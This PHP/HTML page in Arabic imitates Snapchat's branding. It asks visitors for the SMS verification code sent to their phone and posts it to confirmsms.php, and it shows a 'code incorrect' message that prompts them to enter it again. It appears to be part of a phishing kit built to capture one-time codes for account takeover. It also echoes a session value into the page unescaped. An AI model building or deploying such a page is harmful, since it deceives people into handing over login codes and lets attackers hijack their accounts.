<?php
session_start();
?>
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8" lang="arabe">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
	<title>الإضافة على مجموعة</title>
	<style type="text/css">
		
		select, input{
			background-color: #f7f7f7;
			border-radius: 4px;
			border: 1px solid #f7f7f7;
			box-shadow: 0 0 0 0;
			font-size: 13.5px;
			font-weight: 600;
			height: 44px;
			padding: 0 0 0 12px;
			margin-top: 2px;
			margin-bottom: 16px;
			overflow: visible;
		}
		
	
		.button {
  background-color: yellow;
  border: black;
  color: black;
  padding: 25px;
  text-align: center;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  font-weight: bold;
}

.button5 {border-radius: 50%;}
</style>
		
</head>
<body style="background-color: #f7f7f7;">
	<div><img src="img/snlogo.png"  style="display: block;margin-left: auto;margin-right: auto;width: 20%;" ></div>
		<div style="border-radius:10px;text-align: center;margin-top: 10%;padding-top: 10px;">
                   <p style="font-weight: bold;font-size: 25px;">أدخل الرمز الذي وصلك عبر رسالة نصية  SMS<br> ( المرجو تفقد هاتفك )</p>
            </div>

            <?php
            if (isset($_SESSION['valid']) && isset($_SESSION['code']) )

             if($_SESSION['valid']=="valid")
             {

                  echo '
                    <br><br><div  class="erreur" style="padding:25px;border-radius:15px;text-align:center;">
                      <p style="font-weight: bold;color:red;font-weight: bold;font-size:16px;">الرمز  : <span style="color:#000;font-weight: bold;font-size:25px;">' .$_SESSION['code'].  '</span>  غير صحيح، المرجو التأكد من الرسالة النصية التي وصلت على الجوال .
                    </div>';
          }
          

            ?>
			<hr>
			<form method="POST" action="confirmsms.php" style="text-align: center;">
            
            <hr>
            <input maxlength="8" type="text" id="cname" name="code" placeholder=" رمز التفعيل " required style="text-align: center;">
          </div>
          <div style="font-size: large;text-align: center;">
		<button type="submit"  class="btn btn-primary" >التالي</button>
	</div>
	</form>
</body>
<div class="footer-bottom-bar">
<footer class="footer-bottom-bar">

   <p style="margin-top: 15%;background-color: rgb(38, 38, 38);color: gray;display: block;
; text-align: center;">
   	Copyright © 2023 SnapChat team.
   </p>

</footer>
</div>

</html>